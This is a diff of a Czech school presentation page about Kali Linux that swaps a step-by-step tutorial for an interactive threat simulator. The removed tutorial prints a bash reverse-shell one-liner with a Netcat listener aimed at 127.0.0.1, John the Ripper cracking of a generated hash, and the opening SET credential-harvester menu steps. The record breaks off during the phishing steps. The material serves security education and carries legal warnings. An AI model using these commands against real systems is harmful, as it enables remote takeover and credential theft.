@@ -2,574 +2,411 @@
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Kali Linux | Školní projekt (3 Praktické Ukázky)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux | Interaktivní Simulátor Hrozeb</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                        mono: ['JetBrains Mono', 'monospace'],
-                    }
-                }
-            }
-        }
-    </script>
+    
     <style>
-        :root {
-            --bg: #080d12;
-            --surface: #0f1720;
-            --surface2: #162030;
-            --border: rgba(39, 126, 165, 0.18);
-            --accent: #38bdf8;
-            --accent-dim: #277ea5;
-            --green: #4ade80;
-            --yellow: #fbbf24;
-            --red: #f87171;
-            --text: #dde6f0;
-            --muted: #7a94aa;
-        }
-
-        * { box-sizing: border-box; }
-        html { scroll-behavior: smooth; }
-
         body {
-            background: var(--bg);
-            color: var(--text);
+            background-color: #0a0f14;
+            color: #e2e8f0;
             font-family: 'Inter', sans-serif;
-            line-height: 1.7;
-            -webkit-font-smoothing: antialiased;
-            padding-top: env(safe-area-inset-top, 0px);
-            padding-bottom: env(safe-area-inset-bottom, 0px);
+            overflow-x: hidden;
+        }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        
+        /* Glassmorphism karty */
+        .glass-card {
+            background: rgba(17, 24, 34, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(39, 126, 165, 0.2);
+            transition: transform 0.2s, border-color 0.2s;
+        }
+        .glass-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(56, 189, 248, 0.5);
         }
 
-        /* Sidebar nav */
-        .sidebar {
-            position: fixed;
-            left: 0; top: 0; bottom: 0;
-            width: 260px;
-            background: var(--surface);
-            border-right: 1px solid var(--border);
-            padding: 24px 0;
-            overflow-y: auto;
-            z-index: 40;
+        /* Terminál */
+        .terminal-window {
+            background: #050a0f;
+            border: 1px solid #1e2d3d;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            height: 100%;
             display: flex;
             flex-direction: column;
         }
-        .sidebar-logo {
-            padding: 0 20px 20px;
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 16px;
-        }
-        .sidebar-logo .logo-badge {
-            display: inline-flex;
+        .terminal-header {
+            background: #0d1a26;
+            padding: 10px 16px;
+            border-bottom: 1px solid #1e2d3d;
+            display: flex;
             align-items: center;
             gap: 8px;
-            background: rgba(56,189,248,0.08);
-            border: 1px solid rgba(56,189,248,0.2);
-            border-radius: 8px;
-            padding: 6px 12px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            color: var(--accent);
+            border-radius: 10px 10px 0 0;
         }
-        .nav-section { padding: 0 12px; margin-bottom: 16px; }
-        .nav-label {
-            font-size: 10px; font-weight: 700; letter-spacing: 0.1em;
-            color: var(--accent-dim); padding: 0 8px; margin-bottom: 4px; text-transform: uppercase;
+        .terminal-body {
+            padding: 20px;
+            overflow-y: auto;
+            flex-grow: 1;
+            font-size: 14px;
+            line-height: 1.6;
         }
-        .nav-item {
-            display: flex; align-items: center; gap: 8px; padding: 7px 8px;
-            border-radius: 6px; font-size: 13px; color: var(--muted);
-            text-decoration: none; transition: all 0.15s; cursor: pointer;
-        }
-        .nav-item:hover { background: rgba(56,189,248,0.06); color: var(--text); }
-        .nav-item.active { background: rgba(56,189,248,0.1); color: var(--accent); }
-        .nav-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; flex-shrink: 0; }
-
-        /* Main content */
-        .main { margin-left: 260px; min-height: 100vh; }
-
-        /* Top bar */
-        .topbar {
-            position: sticky; top: 0; background: rgba(8,13,18,0.85); backdrop-filter: blur(12px);
-            border-bottom: 1px solid var(--border); padding: 12px 40px;
-            display: flex; align-items: center; justify-content: space-between; z-index: 30;
-        }
-        .topbar-title { font-size: 14px; color: var(--muted); }
-        .topbar-badge {
-            font-size: 11px; font-family: 'JetBrains Mono', monospace;
-            background: rgba(74,222,128,0.1); border: 1px solid rgba(74,222,128,0.25);
-            color: var(--green); padding: 3px 10px; border-radius: 20px;
-        }
-
-        .content { max-width: 900px; margin: 0 auto; padding: 48px 40px 80px; }
-
-        /* Hero */
-        .hero { margin-bottom: 56px; }
-        .hero-eyebrow {
-            display: inline-flex; align-items: center; gap: 6px; font-family: 'JetBrains Mono', monospace;
-            font-size: 12px; color: var(--accent); margin-bottom: 16px;
-        }
-        .hero-eyebrow::before { content: ''; display: block; width: 20px; height: 1px; background: var(--accent); }
-        .hero h1 { font-size: clamp(28px, 4vw, 44px); font-weight: 700; line-height: 1.2; color: #fff; margin-bottom: 16px; }
-        .hero p { font-size: 16px; color: var(--muted); max-width: 680px; line-height: 1.75; }
         
-        /* Badges */
-        .meta-chip {
-            font-size: 12px; padding: 5px 12px; border-radius: 20px;
-            background: var(--surface2); border: 1px solid var(--border); color: var(--muted); display: inline-block; margin: 4px;
+        /* Animace kurzoru */
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 15px;
+            background-color: #38bdf8;
+            vertical-align: middle;
+            animation: blink 1s step-end infinite;
+            margin-left: 2px;
         }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
-        /* Section headers */
-        .section-header { display: flex; align-items: flex-start; gap: 16px; margin-bottom: 24px; }
-        .section-number {
-            font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700;
-            color: var(--accent); background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.2);
-            border-radius: 6px; padding: 4px 8px; white-space: nowrap; margin-top: 4px;
-        }
-        .section-header h2 { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 4px; }
-        .section-header p { font-size: 14px; color: var(--muted); }
-
-        /* Cards */
-        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 32px; margin-bottom: 32px; scroll-margin-top: 80px; }
-        .card-accent { border-left: 3px solid var(--accent); }
-        .card-green { border-left: 3px solid var(--green); }
-        .card-yellow { border-left: 3px solid var(--yellow); }
-        .card-red { border-left: 3px solid var(--red); }
-
-        /* Info boxes */
-        .info-box { border-radius: 10px; padding: 16px 18px; margin: 16px 0; font-size: 14px; line-height: 1.65; }
-        .info-box.note { background: rgba(56,189,248,0.06); border: 1px solid rgba(56,189,248,0.18); color: #a8cfe8; }
-        .info-box.warning { background: rgba(251,191,36,0.06); border: 1px solid rgba(251,191,36,0.2); color: #e8d070; }
-        .info-box.success { background: rgba(74,222,128,0.06); border: 1px solid rgba(74,222,128,0.2); color: #86e8a8; }
-        .info-box.danger { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.2); color: #f8a0a0; }
-        .info-box-label { font-size: 11px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; margin-bottom: 6px; opacity: 0.8; }
-
-        /* Terminal */
-        .terminal { background: #050a0f; border: 1px solid #1e2d3d; border-radius: 10px; overflow: hidden; margin: 16px 0; position: relative; }
-        .terminal-bar { background: #0d1a26; border-bottom: 1px solid #1e2d3d; padding: 8px 14px; display: flex; align-items: center; gap: 8px; }
-        .t-dot { width: 10px; height: 10px; border-radius: 50%; }
-        .terminal-label { margin-left: 8px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); }
-        .terminal-body { padding: 16px 18px; }
-        .terminal-body pre { font-family: 'JetBrains Mono', monospace; font-size: 13px; line-height: 1.8; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
-        .cmd { color: #e2e8f0; }
-        .kw { color: var(--accent); }
-        .flag { color: var(--yellow); }
-        .arg { color: var(--green); }
-        .comment { color: #4a6070; }
-        .output-line { color: var(--green); }
-        .copy-btn {
-            position: absolute; top: 48px; right: 12px; background: #1a2d3d; border: 1px solid #2d4a5e;
-            color: var(--muted); font-family: 'JetBrains Mono', monospace; font-size: 11px; padding: 4px 10px;
-            border-radius: 5px; cursor: pointer; transition: all 0.15s;
-        }
-        .copy-btn:hover { background: var(--accent-dim); color: #fff; border-color: var(--accent-dim); }
-        .copy-btn.copied { background: rgba(74,222,128,0.2); color: var(--green); border-color: rgba(74,222,128,0.4); }
-
-        /* Speaker notes */
-        .speaker-box { background: rgba(39,126,165,0.07); border: 1px solid rgba(39,126,165,0.2); border-radius: 10px; padding: 16px 18px; margin-top: 20px; }
-        .speaker-label { font-size: 11px; font-weight: 600; color: var(--accent-dim); letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
-        .speaker-label svg { width: 14px; height: 14px; }
-        .speaker-box p { font-size: 13.5px; color: #8eb0c8; font-style: italic; line-height: 1.7; }
-
-        /* TOC sticky */
-        .toc-progress { position: fixed; left: 0; top: 0; height: 3px; background: linear-gradient(to right, var(--accent-dim), var(--accent)); z-index: 100; transition: width 0.1s; }
-
-        @media (max-width: 900px) {
-            .sidebar { display: none; }
-            .main { margin-left: 0; }
-            .topbar { padding: 12px 20px; }
-            .content { padding: 32px 20px 60px; }
-        }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0a0f14; }
+        ::-webkit-scrollbar-thumb { background: #1e2d3d; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #277ea5; }
     </style>
 </head>
-<body>
+<body class="h-screen flex flex-col">
 
-<div class="toc-progress" id="progress"></div>
-
-<!-- SIDEBAR -->
-<nav class="sidebar">
-    <div class="sidebar-logo">
-        <div class="logo-badge"><span>🐉</span><span>KALI LINUX DEMO</span></div>
-    </div>
-
-    <div class="nav-section">
-        <div class="nav-label">Úvod</div>
-        <a href="#uvod-bezpecnost" class="nav-item"><span class="nav-dot"></span> Pravidla a bezpečnost</a>
-    </div>
-
-    <div class="nav-section">
-        <div class="nav-label">1. Prolomení hesla (OS)</div>
-        <a href="#ukazka1-teorie" class="nav-item"><span class="nav-dot"></span> Teorie: Jak OS ukládá hesla</a>
-        <a href="#ukazka1-krok1" class="nav-item"><span class="nav-dot"></span> Krok 1: Generování hashe</a>
-        <a href="#ukazka1-krok2" class="nav-item"><span class="nav-dot"></span> Krok 2: Útok (John the Ripper)</a>
-    </div>
-
-    <div class="nav-section">
-        <div class="nav-label">2. Reverse Shell (Síť)</div>
-        <a href="#ukazka2-teorie" class="nav-item"><span class="nav-dot"></span> Teorie: Obejmutí Firewallu</a>
-        <a href="#ukazka2-krok1" class="nav-item"><span class="nav-dot"></span> Krok 1: Naslouchání (Útočník)</a>
-        <a href="#ukazka2-krok2" class="nav-item"><span class="nav-dot"></span> Krok 2: Spuštění (Oběť)</a>
-    </div>
-
-    <div class="nav-section">
-        <div class="nav-label">3. Phishing (Uživatel)</div>
-        <a href="#ukazka3-teorie" class="nav-item"><span class="nav-dot"></span> Teorie: Zranitelnost člověka</a>
-        <a href="#ukazka3-krok1" class="nav-item"><span class="nav-dot"></span> Krok 1: Klonování přes SET</a>
-        <a href="#ukazka3-krok2" class="nav-item"><span class="nav-dot"></span> Krok 2: Získání údajů</a>
-    </div>
-
-    <div class="nav-section">
-        <div class="nav-label">Závěr</div>
-        <a href="#obrana" class="nav-item"><span class="nav-dot"></span> Jak se bránit</a>
-    </div>
-</nav>
-
-<!-- MAIN -->
-<div class="main">
-    <div class="topbar">
-        <span class="topbar-title">Prezentace: Operační systémy — Bezpečnost a zranitelnosti</span>
-        <span class="topbar-badge">✓ Lokální Sandbox</span>
-    </div>
-
-    <div class="content">
-
-        <!-- HERO -->
-        <div class="hero">
-            <div class="hero-eyebrow">KALI LINUX · PRAKTICKÉ UKÁZKY</div>
-            <h1>Simulace 3 klíčových hrozeb pro operační systémy</h1>
-            <p>V této prezentaci si prakticky a zcela bezpečně (na lokálním prostředí `127.0.0.1`) ukážeme tři různé roviny útoku: kompromitaci hesla na úrovni souborového systému, obejití síťového firewallu a nakonec oklamání samotného uživatele OS.</p>
-        </div>
-
-        <!-- ÚVOD -->
-        <div id="uvod-bezpecnost" class="card card-accent">
-            <div class="section-header">
-                <span class="section-number">DISCLAIMER</span>
+    <!-- Horní lišta -->
+    <header class="border-b border-gray-800 bg-black/50 p-4 shrink-0">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <span class="text-2xl">🐉</span>
                 <div>
-                    <h2>Pravidla a bezpečnost</h2>
-                    <p>Před začátkem prezentace</p>
+                    <h1 class="font-bold text-white tracking-wide">KALI LINUX <span class="text-sky-400 font-normal">| Simulátor</span></h1>
+                    <div class="text-xs text-gray-500">Školní projekt - Operační systémy</div>
                 </div>
             </div>
-            <div class="info-box success">
-                <div class="info-box-label">✓ Zcela bezpečné lokální ukázky</div>
-                Všechny příkazy v tomto projektu jsou navrženy tak, aby fungovaly na <strong>tzv. loopback adrese (127.0.0.1)</strong>, tedy počítač komunikuje pouze sám se sebou. Nevysíláme žádná data do školní sítě, neútočíme na žádný cizí cíl.
-            </div>
-            <div class="info-box danger">
-                <div class="info-box-label">⚠️ Upozornění na nelegální činnost</div>
-                Použití těchto nástrojů (Netcat, John the Ripper, SET) na systémy bez výslovného souhlasu jejich majitele je klasifikováno jako trestný čin (neoprávněný přístup k počítačovému systému).
-            </div>
-            <div class="speaker-box">
-                <div class="speaker-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg> Co říct spolužákům</div>
-                <p>"Než začneme s ukázkami, chci zdůraznit jednu věc. Nástroje v Kali Linuxu jsou silné zbraně. Vše, co tady dnes uvidíte, spouštím výhradně uvnitř svého vlastního počítače – na lokální adrese, takže neohrožujeme školní síť. Zkoušet tyto útoky na cizí sítě bez písemné smlouvy je trestný čin."</p>
-            </div>
+            <button id="btn-back" onclick="goHome()" class="hidden px-4 py-2 text-sm font-semibold text-gray-300 bg-gray-800 hover:bg-gray-700 rounded-lg border border-gray-700 transition">
+                ← Zpět na výběr
+            </button>
+        </div>
+    </header>
+
+    <!-- HLAVNÍ MENU (Výběr útoků) -->
+    <main id="view-home" class="flex-grow max-w-7xl mx-auto w-full p-6 py-12">
+        <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-5xl font-bold text-white mb-4">Interaktivní ukázky hrozeb</h2>
+            <p class="text-gray-400 max-w-2xl mx-auto">Zvolte scénář. Každá ukázka obsahuje teoretický úvod a automatizovanou simulaci chování systému a útočníka v terminálu.</p>
         </div>
 
-
-        <!-- ========================================== -->
-        <!-- UKÁZKA 1: HESLA                            -->
-        <!-- ========================================== -->
-        <div style="margin-top: 64px; margin-bottom: 24px; border-bottom: 2px solid var(--border); padding-bottom: 12px;">
-            <h2 style="font-size: 28px; font-weight: 700; color: #fff;">Ukázka 1: Prolomení systémového hesla (Offline)</h2>
-            <p style="color: var(--muted); font-size: 15px;">Ukázka toho, jak OS (Linux) chrání hesla a jak tuto ochranu může útočník prolomit, pokud získá přístup k souboru /etc/shadow.</p>
-        </div>
-
-        <div id="ukazka1-teorie" class="card card-accent">
-            <div class="section-header">
-                <span class="section-number">1. TEORIE</span>
-                <div>
-                    <h2>Jak OS ukládá hesla (Hashování)</h2>
-                </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <!-- Útok 1 -->
+            <div class="glass-card rounded-2xl p-8 cursor-pointer flex flex-col" onclick="startScenario('hash')">
+                <div class="w-12 h-12 bg-sky-900/50 text-sky-400 rounded-xl flex items-center justify-center text-2xl mb-6 border border-sky-500/30">🔑</div>
+                <h3 class="text-xl font-bold text-white mb-3">1. Prolomení hesla</h3>
+                <p class="text-gray-400 text-sm mb-8 flex-grow">Ukázka toho, jak OS chrání hesla (hashování) a jak tuto obranu překoná offline slovníkový útok přes John the Ripper.</p>
+                <button class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-black font-bold rounded-lg transition shadow-[0_0_15px_rgba(56,189,248,0.3)]">
+                    Začít simulaci →
+                </button>
             </div>
-            <p style="font-size:14px; margin-bottom: 16px;">Operační systémy neukládají hesla v čistém textu, ale využívají tzv. <strong>hashovací funkce</strong> (např. SHA-512). Heslo se přemění na dlouhou změť znaků, ze které jej nelze matematicky vypočítat zpět. Útočník musí ukrást tento hash a hrubou silou nebo pomocí slovníku zkoušet různá slova, dokud nevytvoří stejný hash.</p>
-            <div class="speaker-box">
-                <div class="speaker-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg> Co říct spolužákům</div>
-                <p>"Kdyby Linux ukládal hesla normálně v textu a někdo by se do něj naboural, měl by hned všechna hesla. Linux z nich proto dělá takzvaný 'hash' – nevratnou šifru. My si teď nasimulujeme situaci, kdy útočník tento zahashovaný soubor z Linuxu ukradl."</p>
-            </div>
-        </div>
 
-        <div id="ukazka1-krok1" class="card card-accent">
-            <div class="section-header">
-                <span class="section-number">1. KROK 1</span>
-                <div>
-                    <h2>Generování "ukradeného" hashe</h2>
-                </div>
+            <!-- Útok 2 -->
+            <div class="glass-card rounded-2xl p-8 cursor-pointer flex flex-col" onclick="startScenario('shell')">
+                <div class="w-12 h-12 bg-yellow-900/50 text-yellow-400 rounded-xl flex items-center justify-center text-2xl mb-6 border border-yellow-500/30">🔌</div>
+                <h3 class="text-xl font-bold text-white mb-3">2. Reverse Shell</h3>
+                <p class="text-gray-400 text-sm mb-8 flex-grow">Jak útočník obejde Firewall operačního systému tím, že donutí oběť navázat spojení směrem ven k útočníkovi (Netcat).</p>
+                <button class="w-full py-3 bg-yellow-500 hover:bg-yellow-400 text-black font-bold rounded-lg transition shadow-[0_0_15px_rgba(251,191,36,0.2)]">
+                    Začít simulaci →
+                </button>
             </div>
-            <div class="terminal">
-                <div class="terminal-bar"><div class="t-dot" style="background:#ff5f57"></div><div class="t-dot" style="background:#febc2e"></div><div class="t-dot" style="background:#28c840"></div><span class="terminal-label">kali@demo: ~</span></div>
-                <div class="terminal-body">
-                    <pre><span class="comment"># Vytvoříme hash (SHA-512) ze slabého hesla 'tajneheslo' a uložíme do textového souboru</span>
-<span class="kw">echo</span> <span class="arg">"reditel:$(openssl passwd -6 -salt sul tajneheslo)"</span> > k_prolomeni.txt
 
-<span class="comment"># Zobrazíme si výsledek (simulace toho, co útočník ukradl)</span>
-<span class="kw">cat</span> k_prolomeni.txt</pre>
-                    <button class="copy-btn" onclick="copyMe(this)">Kopírovat</button>
-                </div>
+            <!-- Útok 3 -->
+            <div class="glass-card rounded-2xl p-8 cursor-pointer flex flex-col" onclick="startScenario('phishing')">
+                <div class="w-12 h-12 bg-red-900/50 text-red-400 rounded-xl flex items-center justify-center text-2xl mb-6 border border-red-500/30">🎣</div>
+                <h3 class="text-xl font-bold text-white mb-3">3. Phishing (SET)</h3>
+                <p class="text-gray-400 text-sm mb-8 flex-grow">Když nejde prolomit OS, útočí se na uživatele. Klonování přihlašovací stránky pomocí nástroje Social-Engineer Toolkit.</p>
+                <button class="w-full py-3 bg-red-500 hover:bg-red-400 text-white font-bold rounded-lg transition shadow-[0_0_15px_rgba(248,113,113,0.3)]">
+                    Začít simulaci →
+                </button>
             </div>
         </div>
+    </main>
 
-        <div id="ukazka1-krok2" class="card card-accent">
-            <div class="section-header">
-                <span class="section-number">1. KROK 2</span>
-                <div>
-                    <h2>Slovníkový útok (John the Ripper)</h2>
-                </div>
-            </div>
-            <div class="terminal">
-                <div class="terminal-bar"><div class="t-dot" style="background:#ff5f57"></div><div class="t-dot" style="background:#febc2e"></div><div class="t-dot" style="background:#28c840"></div><span class="terminal-label">kali@demo: ~</span></div>
-                <div class="terminal-body">
-                    <pre><span class="comment"># Spustíme nástroj John The Ripper na náš soubor s hashem</span>
-<span class="comment"># (John automaticky pozná formát a začne zkoušet hesla ze zabudovaného slovníku)</span>
-<span class="kw">john</span> k_prolomeni.txt
-
-<span class="comment"># Pro zobrazení nalezeného hesla</span>
-<span class="kw">john</span> <span class="flag">--show</span> k_prolomeni.txt</pre>
-                    <button class="copy-btn" onclick="copyMe(this)">Kopírovat</button>
-                </div>
-            </div>
-            <div class="speaker-box">
-                <div class="speaker-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg> Co říct spolužákům</div>
-                <p>"Teď jsem spustil John the Ripper. Ten neútočí přes internet – běží offline v mém počítači. Extrémní rychlostí bere slova ze slovníku, hashuje je a porovnává s mým souborem. Protože oběť použila hloupé heslo 'tajneheslo', systém ho rozlouskl prakticky okamžitě. Tímto útočník překonal systémovou obranu hesel."</p>
-            </div>
-        </div>
-
-
-        <!-- ========================================== -->
-        <!-- UKÁZKA 2: REVERSE SHELL                    -->
-        <!-- ========================================== -->
-        <div style="margin-top: 64px; margin-bottom: 24px; border-bottom: 2px solid var(--border); padding-bottom: 12px;">
-            <h2 style="font-size: 28px; font-weight: 700; color: #fff;">Ukázka 2: Ovládnutí PC přes Reverse Shell</h2>
-            <p style="color: var(--muted); font-size: 15px;">Jak útočník obejde Firewall operačního systému tím, že donutí oběť navázat spojení směrem ven.</p>
-        </div>
-
-        <div id="ukazka2-teorie" class="card card-yellow">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--yellow); border-color:var(--yellow); background:rgba(251,191,36,0.1)">2. TEORIE</span>
-                <div>
-                    <h2>Problém jménem Firewall</h2>
-                </div>
-            </div>
-            <p style="font-size:14px; margin-bottom: 16px;">Klasický útok zvenčí často narazí na <strong style="color:#fff">Firewall</strong> OS, který funguje jako vyhazovač a blokuje neznámá příchozí spojení (tzv. Bind Shell). Útočníci proto používají <strong style="color:#fff">Reverse Shell</strong>. Spočívá v tom, že škodlivý kód, který oběť omylem spustí, aktivně zavolá <em>ven z počítače</em> přímo útočníkovi. Protože Firewally běžně nezakazují odchozí provoz (abyste mohli surfovat na webu), OS toto spojení propustí.</p>
-            <div class="speaker-box">
-                <div class="speaker-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg> Co říct spolužákům</div>
-                <p>"Představte si Firewall ve Windows jako strážného, který nikoho cizího nepustí dovnitř do firmy. Ale když někdo uvnitř zvedne telefon a zavolá ven komplicovi, strážný to neřeší. Reverse shell je přesně tenhle 'telefonát' zevnitř ven. My si ho teď nasimulujeme."</p>
-            </div>
-        </div>
-
-        <div id="ukazka2-krok1" class="card card-yellow">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--yellow); border-color:var(--yellow); background:rgba(251,191,36,0.1)">2. KROK 1</span>
-                <div>
-                    <h2>Příprava naslouchání (Počítač útočníka)</h2>
-                </div>
-            </div>
-            <p style="font-size:14px; margin-bottom: 12px;">Útočník spustí ve svém Kali Linuxu nástroj <strong style="color:#fff">Netcat (nc)</strong>, který bude čekat na spojení na zadaném portu (např. 4444).</p>
-            <div class="terminal">
-                <div class="terminal-bar"><div class="t-dot" style="background:#ff5f57"></div><div class="t-dot" style="background:#febc2e"></div><div class="t-dot" style="background:#28c840"></div><span class="terminal-label">Terminál 1 (Pohled Útočníka)</span></div>
-                <div class="terminal-body">
-                    <pre><span class="comment"># Netcat naslouchá (-l) podrobně (-v) na portu (-p) 4444, bez rozlišení DNS (-n)</span>
-<span class="kw">nc</span> <span class="flag">-lvnp</span> <span class="arg">4444</span></pre>
-                    <button class="copy-btn" onclick="copyMe(this)">Kopírovat</button>
-                </div>
-            </div>
-            <p style="font-size:13px; color: var(--muted); margin-top:8px;">Terminál se "zasekne" a vypíše <code>listening on [any] 4444 ...</code>. Čeká na oběť.</p>
-        </div>
-
-        <div id="ukazka2-krok2" class="card card-yellow">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--yellow); border-color:var(--yellow); background:rgba(251,191,36,0.1)">2. KROK 2</span>
-                <div>
-                    <h2>Spuštění škodlivého kódu (Počítač oběti)</h2>
-                </div>
-            </div>
-            <p style="font-size:14px; margin-bottom: 12px;">Nyní otevři <strong>druhé okno terminálu</strong> (bude představovat počítač oběti, která omylem spustila malware). Protože to děláme lokálně, připojíme se zpět na IP adresu <code>127.0.0.1</code>.</p>
-            <div class="terminal">
-                <div class="terminal-bar"><div class="t-dot" style="background:#ff5f57"></div><div class="t-dot" style="background:#febc2e"></div><div class="t-dot" style="background:#28c840"></div><span class="terminal-label">Terminál 2 (Pohled Oběti - Simulace viru)</span></div>
-                <div class="terminal-body">
-                    <pre><span class="comment"># Příkaz, který přesměruje terminál oběti (bash) do sítě útočníkovi</span>
-<span class="kw">bash</span> -c <span class="arg">'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'</span></pre>
-                    <button class="copy-btn" onclick="copyMe(this)">Kopírovat</button>
-                </div>
-            </div>
-            
-            <div class="info-box danger" style="margin-top:16px;">
-                <div class="info-box-label">🚀 BUM! Přepni zpět do Terminálu 1</div>
-                Jakmile toto oběť potvrdí, vrať se do prvního terminálu (Útočník). Uvidíš, že se spojení navázalo. Když do něj nyní napíšeš <code>whoami</code> nebo <code>ls</code>, vykonává se to v počítači oběti (v našem případě na stejném PC, ale princip je identický).
+    <!-- SIMULÁTOR (Zobrazí se po kliknutí) -->
+    <main id="view-simulator" class="hidden flex-grow max-w-7xl mx-auto w-full p-6 h-full flex flex-col md:flex-row gap-8 overflow-hidden">
+        
+        <!-- Levý panel: Informace a ovládání -->
+        <div class="w-full md:w-5/12 flex flex-col h-full">
+            <div class="mb-4">
+                <div id="sim-badge" class="inline-block px-3 py-1 text-xs font-bold rounded-md bg-sky-900/50 text-sky-400 border border-sky-500/30 mb-3">ÚTOK 1</div>
+                <h2 id="sim-title" class="text-3xl font-bold text-white mb-2">Název scénáře</h2>
             </div>
 
-            <div class="speaker-box">
-                <div class="speaker-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg> Co říct spolužákům</div>
-                <p>"Oběť právě klikla na infikovanou přílohu v mailu. Nevyskočilo na ni žádné okno, systém nevydal žádný zvuk, ale na pozadí odeslal její terminál k útočníkovi. Vidíte? Tady v okně útočníka teď mám plnou kontrolu nad cizím systémem, protože Firewall toto odchozí spojení povolil jako legitimní provoz."</p>
-            </div>
-        </div>
-
-
-        <!-- ========================================== -->
-        <!-- UKÁZKA 3: PHISHING                         -->
-        <!-- ========================================== -->
-        <div style="margin-top: 64px; margin-bottom: 24px; border-bottom: 2px solid var(--border); padding-bottom: 12px;">
-            <h2 style="font-size: 28px; font-weight: 700; color: #fff;">Ukázka 3: Phishing / Oklamání uživatele</h2>
-            <p style="color: var(--muted); font-size: 15px;">Když nejde prolomit zabezpečení OS, je nejjednodušší napadnout ten nejslabší článek: samotného uživatele.</p>
-        </div>
-
-        <div id="ukazka3-teorie" class="card card-red">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--red); border-color:var(--red); background:rgba(248,113,113,0.1)">3. TEORIE</span>
-                <div>
-                    <h2>Sociální inženýrství vs. OS</h2>
-                </div>
-            </div>
-            <p style="font-size:14px; margin-bottom: 16px;">Všechny předchozí snahy bojovaly s architekturou operačního systému. Nástroje jako <strong>SET (Social-Engineer Toolkit)</strong> z Kali Linuxu se softwarové ochraně zcela vyhýbají. Umí naklonovat libovolnou webovou stránku (např. přihlášení do školního portálu). Pokud oběť na takovou falešnou adresu vstoupí a zadá heslo, žádný Firewall ani Antivirus v OS tomu nezabrání – heslo se odešle přímo útočníkovi.</p>
-        </div>
-
-        <div id="ukazka3-krok1" class="card card-red">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--red); border-color:var(--red); background:rgba(248,113,113,0.1)">3. KROK 1</span>
-                <div>
-                    <h2>Klonování stránky (Nástroj SET)</h2>
-                </div>
-            </div>
-            <div class="terminal">
-                <div class="terminal-bar"><div class="t-dot" style="background:#ff5f57"></div><div class="t-dot" style="background:#febc2e"></div><div class="t-dot" style="background:#28c840"></div><span class="terminal-label">kali@demo: ~</span></div>
-                <div class="terminal-body">
-                    <pre><span class="comment"># Spustíme Social Engineering Toolkit jako root</span>
-<span class="kw">sudo</span> setoolkit
-
-<span class="comment"># V textovém menu postupně zadávejte tato čísla (potvrďte Enterem):</span>
-<span class="output-line">1</span> <span class="comment">(Social-Engineering Attacks)</span>
-<span class="output-line">2</span> <span class="comment">(Website Attack Vectors)</span>
-<span class="output-line">3</span> <span class="comment">(Credential Harvester Attack Method)</span>
